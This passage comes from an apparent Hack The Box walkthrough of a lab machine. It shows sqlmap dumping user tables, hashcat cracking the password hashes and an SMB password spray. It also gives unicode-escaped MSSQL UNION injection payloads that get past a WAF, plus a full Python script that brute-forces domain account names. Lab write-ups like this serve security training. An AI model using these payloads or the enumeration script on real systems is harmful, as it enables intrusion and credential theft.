+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching columns for table 'Colleagues' in database 'Hub_DB'
+[</span><span class="sqlmap-timestamp">18:52:18</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching entries for table 'Colleagues' in database 'Hub_DB'
+Database: Hub_DB                                           
+Table: Colleagues                                          
+[17 entries]                                               
++------+----------------------+-------------+----------------------+----------------------+
+| id   | email                | image       | name                 | position             |
++------+----------------------+-------------+----------------------+----------------------+
+| 1    | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
+| 2    | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
+| 3    | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
+| 4    | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
+| 5    | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
+| 6    | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
+| 7    | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
+| 8    | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
+| 9    | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
+| 10   | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
+| 11   | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
+| 12   | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
+| 13   | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
+| 14   | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
+| 15   | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
+| 16   | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
+| 17   | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
++------+----------------------+-------------+----------------------+----------------------+
+
+[</span><span class="sqlmap-timestamp">18:52:23</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] table 'Hub_DB.dbo.Colleagues' dumped to CSV file '/root/.sqlmap/output/10.10.10.179/dump/Hub_DB/Colleagues.csv'
+[</span><span class="sqlmap-timestamp">18:52:23</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching columns for table 'Logins' in database 'Hub_DB'
+[</span><span class="sqlmap-timestamp">18:52:33</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching entries for table 'Logins' in database 'Hub_DB'
+[</span><span class="sqlmap-timestamp">18:52:38</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] recognized possible password hashes in column '[password]'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[</span><span class="sqlmap-timestamp">18:52:38</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] using hash method 'sha384_generic_passwd'
+what dictionary do you want to use?                        
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file                                 
+[3] file with list of dictionary files                     
+&gt; 1                                                        
+[</span><span class="sqlmap-timestamp">18:52:38</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] using default dictionary                 
+do you want to use common password suffixes? (slow!) [y/N] N
+[</span><span class="sqlmap-timestamp">18:52:38</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] starting dictionary-based cracking (sha384_generic_passwd)
+[</span><span class="sqlmap-timestamp">18:52:38</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] starting 3 processes                     
+[</span><span class="sqlmap-timestamp">18:52:50</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] no clear password(s) found
+Database: Hub_DB 
+Table: Logins                                              
+[17 entries]
++------+----------+--------------------------------------------------------------------------------------------------+
+| id   | username | password                                                                                         |
++------+----------+--------------------------------------------------------------------------------------------------+
+| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
++------+----------+--------------------------------------------------------------------------------------------------+
+
+[</span><span class="sqlmap-timestamp">18:52:50</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] table 'Hub_DB.dbo.Logins' dumped to CSV file '/root/.sqlmap/output/10.10.10.179/dump/Hub_DB/Logins.csv'
+[</span><span class="sqlmap-timestamp">18:52:50</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.179' 
+</span></code></pre></div></div>
+<p>Now I’ve got usernames and password hashes.</p>
+<h3 id="crack-hashes">Crack Hashes</h3>
+<p>The <code class="language-plaintext highlighter-rouge">sqlmap</code> automated cracker didn’t break any of the hashes, but it uses a limited wordlist. Given the length of the hash, it looks like SHA-384. When I ran <code class="language-plaintext highlighter-rouge">hashcat</code> with <code class="language-plaintext highlighter-rouge">-m 10800</code> for SHA-384 with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, nothing broke. There’s two other formats on the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat example hashes</a> page - SHA3-384 (<code class="language-plaintext highlighter-rouge">-m 17500</code>) and Keccak-384 (<code class="language-plaintext highlighter-rouge">-m 17900</code>). When I ran with the latter, I got results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>hashcat <span class="nt">-m</span> 17900 hashes /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+<span class="go">hashcat (v5.1.0) starting...
+...[snip]...
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
+68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
+Approaching final keyspace - workload adjusted.  
+...[snip]...
+</span></code></pre></div></div>
+<p>While there’s a bunch of users in the database, there were only four unique passwords, and three broke with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Password</th>
+<th>Users</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>password1</td>
+<td>sbauer, shayna, james, cyork, jorden, aldom</td>
+</tr>
+<tr>
+<td>finance1</td>
+<td>ckane, kpage, zac, ilee, zpowers</td>
+</tr>
+<tr>
+<td>banking1</td>
+<td>okent, rmartin, alyx, nbourne</td>
+</tr>
+<tr>
+<td>?</td>
+<td>minatotw, egre55</td>
+</tr>
+</tbody>
+</table>
+<h3 id="test-creds">Test Creds</h3>
+<p>I used <code class="language-plaintext highlighter-rouge">crackmapexec</code> to see if I could use any of these creds over SMB, but they all failed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>crackmapexec smb 10.10.10.179 <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> passwords
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (SMBv1:True)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\sbauer:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\sbauer:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\sbauer:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\okent:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\okent:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\okent:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\ckane:password1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\ckane:finance1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\ckane:banking1 STATUS_LOGON_FAILURE 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.179    445    MULTIMASTER      </span><span class="netexec-logfail">[-]</span><span class="go"> MEGACORP\kpage:password1 STATUS_LOGON_FAILURE 
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="dump-domain-users">Dump Domain Users</h3>
+<p>A bit stuck, I eventually turned back to the database and <a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">this article</a> on how to dump domain users from MSSQL. It shows how to do it through intended interactions with the database, and at the very end through Metasploit / SQLi.</p>
+<h4 id="back-to-manual">Back to Manual</h4>
+<p>Given that I’m going into new territory, I decided to go back to manual SQLi at this point. I have the example query from <code class="language-plaintext highlighter-rouge">sqlmap</code> for UNION 5 columns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: {"name":"test' UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CHAR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm"}
+</code></pre></div></div>
+<p>If I look at that query, it’s clearly putting 58 into columns 1, 2, 3, and 5, and then some long string in column 4.</p>
+<p>There’s also this warning:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[WARNING] changes made by tampering scripts are not included in shown payload content(s)
+</code></pre></div></div>
+<p>The easiest place I found to work was <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, where I could use the Escape Unicode Characters recipe, and then just update the input and copy out the result:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331063716896.webp" type="image/webp"/>
+<img alt="image-20200331063716896" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331063716896.png"/>
+</picture>
+<p>Throwing that into Repeater, the injection works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331063743518.webp" type="image/webp"/>
+<img alt="image-20200331063743518" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331063743518.png"/>
+</picture>
+<p>I can see the static string in the <code class="language-plaintext highlighter-rouge">email field</code>.</p>
+<h4 id="get-default-domain">Get Default Domain</h4>
+<p>First step is to get the domain name with <code class="language-plaintext highlighter-rouge">SELECT DEFAULT_DOMAIN()</code>. I can just replace all the static <code class="language-plaintext highlighter-rouge">CHAR</code> with that query to get:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="s1">' UNION ALL SELECT 58,58,58,DEFAULT_DOMAIN(),58-- gxQm
+</span></code></pre></div></div>
+<p>Which encodes to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\u0074\u0065\u0073\u0074\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u0044\u0045\u0046\u0041\u0055\u004C\u0054\u005F\u0044\u004F\u004D\u0041\u0049\u004E\u0028\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D
+</code></pre></div></div>
+<p>Which returns MEGACORP:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331064000628.webp" type="image/webp"/>
+<img alt="image-20200331064000628" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331064000628.png"/>
+</picture>
+<h4 id="get-a-domain-rid">Get a Domain RID</h4>
+<p>Now I need to get a domain RID using the <code class="language-plaintext highlighter-rouge">SUSER_SID</code> function on a known group (I’ll use <code class="language-plaintext highlighter-rouge">MEGACORP/Domain Admins</code>):</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="s1">' UNION ALL SELECT 58,58,58,SUSER_SID('</span><span class="n">MEGACORP</span><span class="err">\</span><span class="k">Domain</span> <span class="n">Admins</span><span class="s1">'),58-- gxQm
+</span></code></pre></div></div>
+<p>Returns a result, but it’s a funky encoding because it’s being interpreted as a string:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331064533176.webp" type="image/webp"/>
+<img alt="image-20200331064533176" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331064533176.png"/>
+</picture>
+<p>The article shows a nice hex number coming back, not that garbage. On <a href="https://stackoverflow.com/questions/703019/convert-integer-to-hex-and-hex-to-integer">StackOverflow</a> I found how I could convert this to hex in the query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="s1">' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('</span><span class="n">MEGACORP</span><span class="err">\</span><span class="k">Domain</span> <span class="n">Admins</span><span class="s1">')),58-- gxQm
+</span></code></pre></div></div>
+<p>And it works:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331064726245.webp" type="image/webp"/>
+<img alt="image-20200331064726245" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331064726245.png"/>
+</picture>
+<p>The RID is <code class="language-plaintext highlighter-rouge">0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000</code>, which makes the domain SID <code class="language-plaintext highlighter-rouge">0x0105000000000005150000001c00d1bcd181f1492bdfc236</code>.</p>
+<h4 id="build-a-user-rid">Build a User RID</h4>
+<p>I know the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be <code class="language-plaintext highlighter-rouge">0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000</code>. To check, I’ll run <code class="language-plaintext highlighter-rouge">SUSER_SNAME</code>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="s1">' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),58-- gxQm
+</span></code></pre></div></div>
+<p>Results in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200331065317670.webp" type="image/webp"/>
+<img alt="image-20200331065317670" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200331065317670.png"/>
+</picture>
+<p>It worked!</p>
+<h4 id="script-brute-force">Script Brute Force</h4>
+<p>I’ll need a script to brute force across the possible SIDs that could be in use by users. What I came up with was this:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">struct</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+
+<span class="n">payload_template</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">test</span><span class="sh">'</span><span class="s"> UNION ALL SELECT 58,58,58,{},58-- -</span><span class="sh">"""</span>
+
+
+<span class="k">def</span> <span class="nf">unicode_escape</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sa">r</span><span class="sh">"</span><span class="s">\u{:04x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">issue_query</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
+            <span class="sh">"</span><span class="s">http://10.10.10.179/api/getColleagues</span><span class="sh">"</span><span class="p">,</span>
+            <span class="n">data</span><span class="o">=</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="s">:</span><span class="sh">"'</span> <span class="o">+</span> <span class="nf">unicode_escape</span><span class="p">(</span><span class="n">payload_template</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sql</span><span class="p">))</span> <span class="o">+</span> <span class="sh">'"</span><span class="s">}</span><span class="sh">'</span><span class="p">,</span>
+            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/json; charset=utf-8</span><span class="sh">"</span><span class="p">},</span>
+            <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">},</span>
+        <span class="p">)</span>
+        <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">403</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="se">\r</span><span class="s">[-] Triggered WAF. Sleeping for 30 seconds</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">]</span>
+
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Finding domain</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">domain</span> <span class="o">=</span> <span class="nf">issue_query</span><span class="p">(</span><span class="sh">"</span><span class="s">DEFAULT_DOMAIN()</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Found domain: </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Finding Domain SID</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">sid</span> <span class="o">=</span> <span class="nf">issue_query</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">master.dbo.fn_varbintohexstr(SUSER_SID(</span><span class="sh">'</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s">\Domain Admins</span><span class="sh">'</span><span class="s">))</span><span class="sh">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Found SID for </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s"> domain: </span><span class="si">{</span><span class="n">sid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">10500</span><span class="p">):</span>
+    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="s">[*] Checking SID </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">i</span><span class="p">)).</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="n">acct</span> <span class="o">=</span> <span class="nf">issue_query</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">SUSER_SNAME(</span><span class="si">{</span><span class="n">sid</span><span class="si">}{</span><span class="n">num</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">acct</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="s">[+] Found account [</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">05</span><span class="n">d</span><span class="si">}</span><span class="s">]  </span><span class="si">{</span><span class="n">acct</span><span class="si">}</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</code></pre></div></div>
+<p>There were two tricky parts:</p>
+<ul>
+<li>The WAF has some kind of dumb rate limiting. I think it’s looking at requests over some time period and returning 403 if there are too many. I just have a loop that sleeps for 30 seconds and tries again if there’s a 403. The current parameters are to sleep 30 seconds on a 403, and 1 second between requests. It’s possible those could be optimized.</li>
+<li>Getting Python to actually send <code class="language-plaintext highlighter-rouge">\u0027</code> was tricker than I expected. I originally was doing <code class="language-plaintext highlighter-rouge">json={"name":""}</code> in the POST, but Python is too nice about formatting that. Changing it to <code class="language-plaintext highlighter-rouge">data</code> and setting it the way I have above took some trial and error through the proxy.</li>
+<li>Sending through Burp was really nice, and it didn’t really slow anything down since I was already going slow for the WAF.</li>
+</ul>
+<p>The script finds new accounts I didn’t previously know about:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>./get_domain_users.py 
+<span class="go">[*] Finding domain
+[+] Found domain: MEGACORP
+[*] Finding Domain SID
+[+] Found SID for MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+[+] Found account [00500]  MEGACORP\Administrator                              
+[+] Found account [00501]  MEGACORP\Guest                              
+[+] Found account [00502]  MEGACORP\krbtgt                              
+[+] Found account [00503]  MEGACORP\DefaultAccount                              
+[+] Found account [00512]  MEGACORP\Domain Admins                              
+[+] Found account [00513]  MEGACORP\Domain Users                              
+[+] Found account [00514]  MEGACORP\Domain Guests                              
+[+] Found account [00515]  MEGACORP\Domain Computers                              
+[+] Found account [00516]  MEGACORP\Domain Controllers                              
+[+] Found account [00517]  MEGACORP\Cert Publishers                              
+[+] Found account [00518]  MEGACORP\Schema Admins                              
+[+] Found account [00519]  MEGACORP\Enterprise Admins                              
+[+] Found account [00520]  MEGACORP\Group Policy Creator Owners                              
+[+] Found account [00521]  MEGACORP\Read-only Domain Controllers                              
+[+] Found account [00522]  MEGACORP\Cloneable Domain Controllers                              
+[+] Found account [00525]  MEGACORP\Protected Users                              
+[+] Found account [00526]  MEGACORP\Key Admins                              
+[+] Found account [00527]  MEGACORP\Enterprise Key Admins                              
+[+] Found account [00553]  MEGACORP\RAS and IAS Servers                              
+[+] Found account [00571]  MEGACORP\Allowed RODC Password Replication Group                              
+[+] Found account [00572]  MEGACORP\Denied RODC Password Replication Group                              
+[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
+[+] Found account [01101]  MEGACORP\DnsAdmins                              
+[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
+[+] Found account [01103]  MEGACORP\svc-nas                              
+[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
+[+] Found account [01110]  MEGACORP\tushikikatomo                              
+[+] Found account [01111]  MEGACORP\andrew                              
+[+] Found account [01112]  MEGACORP\lana                               
+[+] Found account [01601]  MEGACORP\alice                              
+[+] Found account [01602]  MEGACORP\test                               
+[+] Found account [02101]  MEGACORP\dai                                
+[+] Found account [02102]  MEGACORP\svc-sql                              
+[+] Found account [03101]  MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
+[+] Found account [03102]  MEGACORP\sbauer                              
+[+] Found account [03103]  MEGACORP\okent                              
+[+] Found account [03104]  MEGACORP\ckane                              
+[+] Found account [03105]  MEGACORP\kpage                              
+[+] Found account [03106]  MEGACORP\james                              
+[+] Found account [03107]  MEGACORP\cyork                              
+[+] Found account [03108]  MEGACORP\rmartin                              
+[+] Found account [03109]  MEGACORP\zac                                
+[+] Found account [03110]  MEGACORP\jorden                              
+[+] Found account [03111]  MEGACORP\alyx                               
+[+] Found account [03112]  MEGACORP\ilee                               
+[+] Found account [03113]  MEGACORP\nbourne                              
+[+] Found account [03114]  MEGACORP\zpowers                              
+[+] Found account [03115]  MEGACORP\aldom                              
